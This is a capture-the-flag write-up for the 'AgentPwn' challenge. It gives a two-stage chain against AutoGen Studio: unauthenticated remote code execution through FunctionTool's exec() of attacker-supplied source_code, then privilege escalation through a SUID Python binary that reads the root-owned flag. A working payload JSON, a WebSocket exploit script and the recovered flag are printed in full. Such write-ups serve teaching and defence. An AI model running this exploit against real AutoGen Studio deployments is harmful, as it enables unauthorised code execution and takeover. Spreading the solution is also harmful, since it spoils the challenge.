# AgentPwn

| Field | Value |
|-------|-------|
| Category | Web |
| Points | 500 |

## Description

> Our company just deployed the hottest AI agent platform — AutoGen Studio.
> The sysadmin also left some "helpful" maintenance utilities lying around
> for the nightly backups.
>
> Can you find your way to the flag?
>
> Service: `http://<host>:8081`

## Solution

# AgentPwn — CTF Writeup

**Category:** Web / Exploit
**Difficulty:** Hard
**Points:** 500
**Flag:** `flag{ag3nt_t00ls_ar3_just_ex3c_in_d1sgu1se}`

---

## Overview

The challenge runs **AutoGen Studio 0.4.2.2** — a Python-based AI agent orchestration platform. The attack surface is its unauthenticated REST + WebSocket API. A critical deserialization vulnerability in `FunctionTool` allows arbitrary Python code execution. Combined with a leftover SUID binary (`python-backup`), full root-level flag read is achievable.

**Two-stage exploit chain:**
1. **RCE** as `ctf` user via FunctionTool `exec()` deserialization
2. **Privilege escalation** via SUID `python-backup` → read `/root/flag.txt`

---

## Reconnaissance

Browse to `http://<host>:8081` — AutoGen Studio UI loads immediately, no login required.

Check the API:

```bash
curl http://localhost:8081/api/health
# {"status":"OK","message":"Service is healthy"}
```

Enumerate endpoints (OpenAPI docs enabled):

```
http://localhost:8081/docs
```

Notable unauthenticated endpoints:
| Method | Endpoint | Purpose |
|--------|----------|---------|
| POST | `/api/sessions/` | Create a chat session |
| POST | `/api/runs/` | Create a run inside a session |
| WS | `/api/ws/runs/{run_id}` | Execute a team via WebSocket |
| GET | `/files/{path}` | Serve static files from `/app/data/files/` |

No API keys, no cookies, no tokens required.

---

## Vulnerability Analysis

### FunctionTool unsafe `exec()`

AutoGen Studio allows sending a `team_config` JSON blob over the WebSocket. When the server loads this configuration, it calls `load_component()` which instantiates each component by class name via `provider`.

For `autogen_core.tools.FunctionTool`, the `_from_config()` method reconstructs the tool from its serialized form. Specifically, it calls:

```python
# autogen_core/tools/_function_tool.py, line ~171
exec(config.source_code, global_ns)
```

where `config.source_code` is fully attacker-controlled from the JSON payload. This executes **before** any API call is made, so no valid OpenAI key is needed.

**Root cause:** Trusting user-supplied serialized code without sandboxing or signing.

---

## Stage 1 — Remote Code Execution

### Payload structure

The malicious payload nests a `FunctionTool` inside a `RoundRobinGroupChat` team:

```json
{
  "provider": "autogen_agentchat.teams.RoundRobinGroupChat",
  "component_type": "team",
  "config": {
    "participants": [{
      "provider": "autogen_agentchat.agents.AssistantAgent",
      "config": {
        "name": "pwn_agent",
        "model_client": { "provider": "...OpenAIChatCompletionClient", "config": {"model": "gpt-4o-mini"} },
        "workbench": {
          "provider": "autogen_core.tools.StaticWorkbench",
          "config": {
            "tools": [{
              "provider": "autogen_core.tools.FunctionTool",
              "config": {
                "source_code": "<MALICIOUS PYTHON>",
                "name": "pwn",
                "description": "tool",
                "global_imports": [],
                "has_cancellation_support": false
              }
            }]
          }
        }
      }
    }]
  }
}
```

### Exploit — exfiltrate via web-accessible file

`/app/data/files/` is served as static files at `/files/`. Write command output there:

```python
source_code = """
import subprocess, os
os.makedirs('/app/data/files', exist_ok=True)
_r = subprocess.run("whoami && id", shell=True, capture_output=True, text=True)
with open('/app/data/files/out.txt', 'w') as _f:
    _f.write(_r.stdout + _r.stderr)
def pwn(x: str = 'a') -> str:
    return 'ok'
"""
```

Full WebSocket flow:

```python
import requests, websockets, asyncio, json

BASE = "http://localhost:8081"
WS   = "ws://localhost:8081"
USER = "guestuser@gmail.com"

# 1. Create session
sid = requests.post(f"{BASE}/api/sessions/",
    json={"user_id": USER, "name": "pwn"}).json()["data"]["id"]

# 2. Create run
rid = requests.post(f"{BASE}/api/runs/",
    json={"session_id": sid, "user_id": USER}).json()["data"]["run_id"]

# 3. Fire via WebSocket
async def fire():
    async with websockets.connect(f"{WS}/api/ws/runs/{rid}") as ws:
        await ws.recv()                          # server ready message
        await ws.send(json.dumps({
            "type": "start",
            "task": "run",
            "team_config": <MALICIOUS_PAYLOAD>
        }))
        for _ in range(10):
            try:
                msg = await asyncio.wait_for(ws.recv(), timeout=10)
                if json.loads(msg).get("type") in ("completion","result"):
                    break
            except: break

asyncio.run(fire())

# 4. Read output
import time; time.sleep(0.5)
print(requests.get(f"{BASE}/files/out.txt").text)
```

Result:

```
ctf
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
```

**RCE confirmed as `ctf` user.**

Try reading the flag directly:

```bash
cat /root/flag.txt
# cat: /root/flag.txt: Permission denied
```

Flag is mode `400` owned by root. Need privilege escalation.

---

## Stage 2 — Privilege Escalation

### Find SUID binaries

Use the RCE channel to run:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Output:
```
/usr/local/bin/python-backup
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/chfn
```

`/usr/local/bin/python-backup` stands out — a non-standard binary.

Check `/opt/maintenance/README.txt`:

```
System maintenance tools.
python-backup is used by cron for nightly backups.
```

It's a **copy of `python3.11` with the SUID bit set** (`-rwsr-xr-x root root`). Any user can execute it and it will run as root.

### Read the flag

```bash
/usr/local/bin/python-backup -c "print(open('/root/flag.txt').read())"
```

Via the RCE channel:

```python
flag = await fire_rce(
    "/usr/local/bin/python-backup -c \"print(open('/root/flag.txt').read())\""
)
print(flag)
```

Output:

```
flag{ag3nt_t00ls_ar3_just_ex3c_in_d1sgu1se}
```

---

## Automated Solution

Run `solve.py` (organizer file):

```bash
pip install requests websockets
python3 solve.py localhost 8081
```

Expected output:

```
=======================================================
  AgentPwn CTF - Automated Solve
=======================================================

  Target: http://localhost:8081

[+] Target is up: Service is healthy

--- Stage 1: RCE via FunctionTool exec() ---

[+] RCE confirmed: ctf
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
[+] Direct flag read (should fail): cat: /root/flag.txt: Permission denied

--- Stage 2: Privilege Escalation ---

[+] SUID binaries:
/usr/local/bin/python-backup
...

=======================================================
  FLAG CAPTURED: flag{ag3nt_t00ls_ar3_just_ex3c_in_d1sgu1se}
=======================================================
```

---

## Root Cause & Patch

| | Detail |
|---|---|
| **Vulnerable code** | `autogen_core/tools/_function_tool.py:171` — `exec(config.source_code, global_ns)` |
| **Root cause** | Deserialization of user-controlled Python source code without sandboxing |
| **Authentication** | None required on any API endpoint |
| **Fix** | Reject `FunctionTool` configs from untrusted sources; add authentication to WebSocket/API; use AST allowlisting instead of raw `exec()` |

---

## Timeline

1. Browse to AutoGen Studio → no auth required
2. Read API docs at `/docs` → WebSocket run endpoint accepts `team_config`
3. Fuzz `team_config` structure → discover `FunctionTool.source_code` is `exec()`'d
4. Build malicious payload → RCE as `ctf`
5. Enumerate SUID binaries → find `python-backup`
6. Read flag via SUID python interpreter

---

*Flag: `flag{ag3nt_t00ls_ar3_just_ex3c_in_d1sgu1se}`*


## Flag

`flag{ag3nt_t00ls_ar3_just_ex3c_in_d1sgu1se}`
